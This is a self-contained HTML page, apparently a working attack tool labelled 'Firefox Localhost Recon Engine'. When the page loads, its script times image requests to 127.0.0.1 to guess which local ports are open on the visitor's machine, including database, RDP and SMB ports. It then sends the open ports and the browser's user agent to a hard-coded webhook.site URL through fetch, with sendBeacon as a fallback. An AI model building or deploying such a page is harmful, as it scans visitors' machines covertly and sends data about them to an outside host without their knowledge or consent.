<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <title>High-Fidelity Port Auditor</title>
    <style>
        body { background-color: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #161b22; width: 650px; border-radius: 12px; border: 1px solid #30363d; overflow: hidden; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        .header { background: #21262d; padding: 15px; text-align: center; border-bottom: 1px solid #30363d; color: #58a6ff; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }
        .terminal { padding: 20px; height: 350px; overflow-y: auto; font-family: 'Consolas', monospace; font-size: 13px; background: #010409; border-bottom: 1px solid #30363d; }
        .line { margin-bottom: 5px; border-left: 3px solid #30363d; padding-left: 10px; color: #8b949e; }
        .open { color: #3fb950; font-weight: bold; border-left: 3px solid #3fb950; background: rgba(63, 185, 80, 0.1); padding: 5px; }
        .footer { padding: 10px; font-size: 11px; text-align: center; background: #161b22; color: #8b949e; }
        .progress { height: 3px; background: #58a6ff; width: 0%; transition: width 0.2s; }
    </style>
</head>
<body>

<div class="card">
    <div class="header">Firefox Localhost Recon Engine</div>
    <div id="bar" class="progress"></div>
    <div id="log" class="terminal"></div>
    <div class="footer">Target: 127.0.0.1 | Exfiltrating to Webhook</div>
</div>

<script>
    const WEBHOOK = "https://webhook.site/5c8dfb93-43de-4bdc-8216-4895cb4b323d";
    const logBox = document.getElementById('log');
    const ports = [80,81,135,443,445,902,912,1080,1433,1521,2049,2179,2869,3000,3306,3389,4000,4433,5000,5040,5432,6379,7250,8000,8080,8081,8443,8888,9000,9090,27017,31148,44950,63479];

    function log(msg, isOpen = false) {
        const div = document.createElement('div');
        div.className = isOpen ? "line open" : "line";
        div.innerHTML = `> ${msg}`;
        logBox.appendChild(div);
        logBox.scrollTop = logBox.scrollHeight;
    }

    async function getLatency(port) {
        const start = performance.now();
        return new Promise((resolve) => {
            const img = new Image();
            img.onload = () => resolve(performance.now() - start);
            img.onerror = () => resolve(performance.now() - start);
            img.src = `http://127.0.0.1:${port}/favicon.ico?v=${Math.random()}`;
            setTimeout(() => resolve(1000), 1000);
        });
    }

    window.onload = async function() {
        log("Environment check: Calibrating baseline...");
        let baselineSum = 0;
        for(let b=0; b<3; b++) baselineSum += await getLatency(61234 + b);
        const baseline = baselineSum / 3;
        
        log(`Baseline: ${baseline.toFixed(2)}ms. Probing ports...`);
        let found = [];

        for (let i = 0; i < ports.length; i++) {
            const port = ports[i];
            const time = await getLatency(port);
            if (time < baseline * 0.4 || time < 20) {
                log(`CONFIRMED OPEN: Port ${port}`, true);
                found.push({ port: port, latency: time.toFixed(2) + "ms" });
            }
            document.getElementById('bar').style.width = `${((i+1)/ports.length)*100}%`;
        }

        log("Scan Complete. Exfiltrating...");

        if (found.length > 0) {
            const payload = {
                ts: new Date().toLocaleString(),
                browser: navigator.userAgent,
                open_ports: found
            };

            // FIX: Using Blob with plain text type for no-cors compatibility
            const blob = new Blob([JSON.stringify(payload)], { type: 'text/plain' });
            
            fetch(WEBHOOK, {
                method: 'POST',
                mode: 'no-cors',
                body: blob
            }).then(() => {
                log("Report sent to Webhook!", true);
            }).catch(() => {
                // Backup Method: Beacon API
                navigator.sendBeacon(WEBHOOK, JSON.stringify(payload));
                log("Report sent via backup beacon.", true);
            });
        }
    };
</script>
</body>
</html>
